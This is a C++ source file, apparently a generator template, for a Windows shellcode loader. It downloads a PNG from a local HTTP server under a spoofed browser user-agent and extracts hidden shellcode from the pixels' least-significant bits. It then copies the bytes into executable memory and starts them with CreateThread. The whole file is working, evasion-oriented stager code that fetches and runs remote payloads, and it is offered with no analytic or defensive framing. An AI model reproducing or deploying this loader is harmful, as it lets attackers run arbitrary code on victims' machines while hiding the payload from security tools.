#include <windows.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <string>
#define PAYLOAD_BITS {{ PAYLOAD_BITS }}
#pragma comment(lib,"gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;


char get_lsb(char target, char source) {
    return (target << 1) | (source & 1);
}



const int shellcode_len = PAYLOAD_BITS;
char* payload_data = new char[shellcode_len / 8];



void read_image() {
    // get image from http server 
    HINTERNET hSession, hConnect, hRequest;

    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    hConnect = WinHttpConnect(
        hSession,
        L"127.0.0.1",
        8000,
        0
    );

    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        L"/shellcode_x86.png",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0
    );

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwSize;
    DWORD dwBytesRead;
    DWORD dwOffset = 0;

    WinHttpQueryDataAvailable(hRequest, &dwSize);

    std::string data;


    do
    {
        dwOffset = data.size();
        data.resize(dwSize + dwOffset);

        WinHttpQueryDataAvailable(hRequest, &dwSize);
        WinHttpReadData(hRequest, &data[dwOffset], dwSize, &dwBytesRead);

        data.resize(dwBytesRead + dwOffset);

    } while (dwSize > 0);


    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);


    // init an IStream in memory to create a bitmap later
    HGLOBAL img_gl_buffer = GlobalAlloc(GMEM_MOVEABLE, data.size() + 1);
    LPVOID img_buffer = GlobalLock(img_gl_buffer);

    CopyMemory(img_buffer, data.c_str(), data.size() + 1);

    IStream* img_stream = NULL;
    CreateStreamOnHGlobal(img_buffer, FALSE, &img_stream);



    // Init Gdiplus
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);



    // load image
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromStream(img_stream);

    Color c;
    char channels[3];

    int length = shellcode_len;
    int pos = 0;

    for (int i = 0; i < bmp->GetHeight(); i++) {
        for (int j = 0; j < bmp->GetWidth(); j++) {
            
            bmp->GetPixel(j, i, &c);
            
            channels[0] = c.GetR();
            channels[1] = c.GetG();
            channels[2] = c.GetB();

            for (int k = 0; k < 3; k++) {
                if (length <= 0) {
                    return;
                }

                payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channels[k]);
                pos++;
                length--;
            }
        }
    }
    GdiplusShutdown(gdiplusToken);
}



void run() {
    //LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    //LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);

    LPVOID ptr = VirtualAlloc(0, (shellcode_len / 8), 0x3000, 0x40);
    RtlMoveMemory(ptr, payload_data, shellcode_len / 8);


    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
    Sleep(2000);
}


int main() {

    read_image();
    run();

    return 0;
}